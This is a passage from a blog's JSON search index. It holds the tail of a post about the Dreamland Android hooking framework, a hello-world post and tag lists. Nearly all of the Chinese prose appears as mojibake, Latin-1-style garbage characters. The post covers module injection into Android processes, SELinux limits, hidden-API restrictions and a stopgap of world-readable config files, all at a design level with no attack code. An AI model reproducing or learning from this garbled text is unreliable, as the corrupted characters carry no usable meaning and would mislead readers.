ä¸ºæ²¡æœ‰é‚£ä¹ˆå¤šæ—¶é—´å»å¼„ï¼Œæ‰€ä»¥åªæ˜¯ç®€å•çš„æŠŠå¯¹åº”çš„é…ç½®æ–‡ä»¶è®¾ç½®æˆè°éƒ½èƒ½è¯»ï¼Œå½“ç„¶ä»¥åä¼šä¼˜åŒ–ã€‚æœªæ¥æ³¨ï¼šæœ¬æ®µå†…å®¹æ²¡æœ‰ä»€ä¹ˆè¥å…»ï¼Œå¯ä»¥ç›´æ¥è·³è¿‡ã€‚ç¼–è¯‘æ‰“åŒ…è‡ªåŠ¨åŒ–å¯¹ï¼Œç›®å‰è¿è‡ªåŠ¨åŒ–æ‰“åŒ…éƒ½æ²¡å®ç°ï¼Œè¿˜æ˜¯æ‰‹åŠ¨æ‹¿dexç­‰ç­‰ç„¶åæ‰‹åŠ¨å‹ç¼©è¿›å»â€¦æ”¯æŒmagiskå®‰è£…ç°åœ¨åªæ”¯æŒé€šè¿‡å®‰è£…è„šæœ¬ç›´æ¥ä¿®æ”¹/systemï¼Œå¦‚æœèƒ½å¤Ÿæ”¯æŒmagiskæ¨¡å—å¼å®‰è£…ä¼šå°‘å¾ˆå¤šéº»çƒ¦ï¼Œæ¯”å¦‚å¦‚æœå˜ç –äº†åªéœ€è¦ç”¨mmç®¡ç†å™¨æŠŠæ¨¡å—ç»™åˆ äº†å°±å¥½äº†æ”¯æŒé‡è¦ç³»ç»Ÿè¿›ç¨‹åŠ è½½æ¨¡å—ç”±äºSELinuxé™åˆ¶ï¼Œç›®å‰ä¸æ”¯æŒå…³é”®ç³»ç»Ÿè¿›ç¨‹ï¼ˆå¦‚Zygoteå’Œsystem_serverï¼‰åŠ è½½æ¨¡å—ï¼Œæˆ‘è¿™è¾¹æ²¡æœ‰ä»€ä¹ˆå¾ˆå¥½çš„è§£å†³åŠæ³•ï¼Œæ±‚å„ä½å¤§ä½¬èµæ•™ :)é¡ºä¾¿åˆ—å‡ºä¸€äº›å…¶ä»–çš„é™åˆ¶ï¼šandroid 9ï¼Œéšè—APIè®¿é—®é™åˆ¶ï¼Œè¿™ä¸ªå¥½åŠï¼Œç»•è¿‡æ–¹å¼æœ‰å¾ˆå¤šï¼Œå°±ä¸ç»†è®²äº†ã€‚Android 9åŠä»¥ä¸Šï¼Œzygote&amp;system_serverè¿˜æœ‰å…¶ä»–ç³»ç»Ÿåº”ç”¨ä¼šSetOnlyUseSystemOatFiles()ï¼Œç„¶åå°±ä¸èƒ½åŠ è½½ä¸åœ¨/systemä¸‹é¢çš„oatæ–‡ä»¶äº†ï¼Œå¦‚æœè¿åè¿™ä¸ªç­–ç•¥å°±ä¼šç›´æ¥abortæ‰ã€‚android zygote forkæ–°è¿›ç¨‹æ—¶ï¼Œå¦‚æœæœ‰ä¸åœ¨ç™½åå•ä¸­çš„æ–‡ä»¶æè¿°ç¬¦ï¼Œä¼šè¿›åˆ°ZygoteFailureé‡Œï¼Œç„¶åæ•´ä¸ªè¿›ç¨‹abortæ‰ã€‚é…ç½®æ–‡ä»¶åŠ è½½éƒ¨åˆ†å› ä¸ºåœ¨ç›®æ ‡è¿›ç¨‹é‡ŒåŠ è½½æ¨¡å—è‚¯å®šéœ€è¦è·å–å¯¹åº”çš„é…ç½®ï¼Œç›®å‰çš„åšæ³•æ˜¯ï¼ŒæŠŠå¯¹åº”çš„é…ç½®æ–‡ä»¶è®¾ç½®æˆè°éƒ½èƒ½è¯»ï¼Œç„¶åç›´æ¥è¯»è¿™ä¸ªæ–‡ä»¶å°±è¡Œï¼Œè¿™æ ·åšå½“ç„¶ä¸å¦¥ï¼Œæ‰€ä»¥è®¡åˆ’ä»¥åå»ä¼˜åŒ–ï¼Œæ¯”å¦‚ä¼˜åŒ–æˆå•ç‹¬è·‘ä¸€ä¸ªé…ç½®å®ˆæŠ¤è¿›ç¨‹ï¼Œåªæœ‰è¿™ä¸ªè¿›ç¨‹èƒ½å»è¯»å†™é…ç½®ï¼Œå…¶ä»–åº”ç”¨åªèƒ½é€šè¿‡è·¨è¿›ç¨‹äº¤äº’çš„æ–¹å¼æ‹¿åˆ°é…ç½®ã€‚é‡æ–°å®ç°Xposed APIç›®å‰æ¢¦å¢ƒçš„Xposed APIæ˜¯SandHookè‡ªå¸¦çš„xposedcompatï¼Œé€šè¿‡DexMakeråŠ¨æ€åˆ›å»ºæ–°çš„dexå®ç°é€‚é…ï¼Œè¿™ä¹ˆåšæ²¡æœ‰ä»€ä¹ˆå…¼å®¹æ€§é—®é¢˜ï¼Œä½†æ˜¯æœ‰å¾ˆå¤§çš„æ•ˆç‡é—®é¢˜ï¼Œå¦‚æœæ˜¯ç¬¬ä¸€æ¬¡åˆ›å»ºè¿™ä¸ªæ–¹æ³•ï¼Œéœ€è¦ç”Ÿæˆdexï¼Œä¸€å¥—æµç¨‹èµ°ä¸‹æ¥å¯èƒ½å°±è¦ç”¨ä¸Š100+msã€‚åœ¨xposedcompat_newä¸­ï¼Œæœ‰å¦ä¸€ç§å®ç°æ–¹æ¡ˆï¼šé€šè¿‡åŠ¨æ€ä»£ç†åŠ¨æ€ç”Ÿæˆæ–¹æ³•ï¼Œç„¶åæŠŠè¿™ä¸ªæ–¹æ³•è®¾ç½®æˆnativeï¼Œå¯¹åº”çš„nativeå‡½æ•°ä¹Ÿæ˜¯é€šè¿‡libffiåŠ¨æ€ç”Ÿæˆçš„ï¼Œåœ¨è¿™ä¸ªnativeæ–¹æ³•é‡Œè·³åˆ°åˆ†å‘å‡½æ•°æ‰§è¡Œã€‚è¿™ä¸ªæ–¹æ¡ˆå¯¹æˆ‘æ¥è¯´å¾ˆä¸é”™ï¼Œè‡³å°‘ä¸ä¼šå¤ªæ…¢ã€‚ï¼ˆå½“ç„¶ç¨³å®šæ€§å­˜ç–‘ï¼‰ç»“è¯­ç›®å‰æ¢¦å¢ƒæ¡†æ¶è¿˜æœ‰éå¸¸å¤šçš„ä¸è¶³ï¼Œç›®å‰åªèƒ½å½“ä¸ªPoCç”¨ï¼Œå¦‚æœä½ æœ‰å…´è¶£ï¼Œä¸å¦¨ä¸€èµ·æ¥ç© ^_^æ ¸å¿ƒï¼šDreamlandé…å¥—çš„ç®¡ç†å™¨ Dreamland ManagerQQç¾¤ï¼š949888394","categories":[],"tags":[{"name":"android","slug":"android","permalink":"https://blog.canyie.top/tags/android/"},{"name":"art","slug":"art","permalink":"https://blog.canyie.top/tags/art/"},{"name":"xposed","slug":"xposed","permalink":"https://blog.canyie.top/tags/xposed/"},{"name":"AOP","slug":"AOP","permalink":"https://blog.canyie.top/tags/AOP/"},{"name":"hook","slug":"hook","permalink":"https://blog.canyie.top/tags/hook/"},{"name":"æ³¨å…¥","slug":"æ³¨å…¥","permalink":"https://blog.canyie.top/tags/%E6%B3%A8%E5%85%A5/"}]},{"title":"æˆ‘ä¹Ÿæœ‰è‡ªå·±çš„ä¸ªäººåšå®¢å•¦ï¼","slug":"hello-world","date":"2019-10-28T12:39:23.000Z","updated":"2025-04-24T10:33:02.819Z","comments":true,"path":"2019/10/28/hello-world/","link":"","permalink":"https://blog.canyie.top/2019/10/28/hello-world/","excerpt":"æˆ‘ä¹Ÿæœ‰è‡ªå·±çš„ä¸ªäººåšå®¢å•¦ï¼","text":"æˆ‘ä¹Ÿæœ‰è‡ªå·±çš„ä¸ªäººåšå®¢å•¦ï¼åŸºäºGitHub Pages + Hexoï¼Œä¸»é¢˜ä¸ºVolantisæœ¬ç«™åœ°å€ï¼šhttps://canyie.github.io/","categories":[],"tags":[{"name":"é—²èŠ","slug":"é—²èŠ","permalink":"https://blog.canyie.top/tags/%E9%97%B2%E8%81%8A/"}]}],"categories":[],"tags":[{"name":"android","slug":"android","permalink":"https://blog.canyie.top/tags/android/"},{"name":"system","slug":"system","permalink":"https://blog.canyie.top/tags/system/"},{"name":"å®‰å…¨","slug":"å®‰å…¨","permalink":"https://blog.canyie.top/tags/%E5%AE%89%E5%85%A8/"},{"name":"parcel","slug":"parcel","permalink":"https://blog.canyie.top/tags/parcel/"},{"name":"å®‰å…¨è¡¥ä¸åˆ†ææ ç›®","slug":"å®‰å…¨è¡¥ä¸åˆ†ææ ç›®","permalink":"https://blog.canyie.top/tags/%E5%AE%89%E5%85%A8%E8%A1%A5%E4%B8%81%E5%88%86%E6%9E%90%E6%A0%8F%E7%9B%AE/"},{"name":"magisk","slug":"magisk","permalink":"https://blog.canyie.top/tags/magisk/"},{"name":"kernel","slug":"kernel","permalink":"https://blog.canyie.top/tags/kernel/"},{"name":"å¹´é‰´","slug":"å¹´é‰´","permalink":"https://blog.canyie.top/tags/%E5%B9%B4%E9%89%B4/"},{"name":"é—²èŠ","slug":"é—²èŠ","permalink":"https://blog.canyie.top/tags/%E9%97%B2%E8%81%8A/"},{"name":"art","slug":"art","permalink":"https://blog.canyie.top/tags/art/"},{"name":"property","slug":"property","permalink":"https://blog.canyie.top/tags/property/"},{"name":"æ•°æ®ç»“æ„ä¸ç®—æ³•","slug":"æ•°æ®ç»“æ„ä¸ç®—æ³•","permalink":"https://blog.canyie.top/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"},{"name":"xposed","slug":"xposed","permalink":"https://blog.canyie.top/tags/xposed/"},{"name":"èˆªç©º","slug":"èˆªç©º","permalink":"https://blog.canyie.top/tags/%E8%88%AA%E7%A9%BA/"},{"name":"æ³¨å…¥","slug":"æ³¨å…¥","permalink":"https://blog.canyie.top/tags/%E6%B3%A8%E5%85%A5/"},{"name":"hidden-api","slug":"hidden-api","permalink":"https://blog.canyie.top/tags/hidden-api/"},{"name":"AOP","slug":"AOP","permalink":"https://blog.canyie.top/tags/AOP/"},{"name":"hook","slug":"hook","permalink":"https://blog.canyie.top/tags/hook/"},{"name":"dex","slug":"dex","permalink":"https://blog.canyie.top/tags/dex/"}]}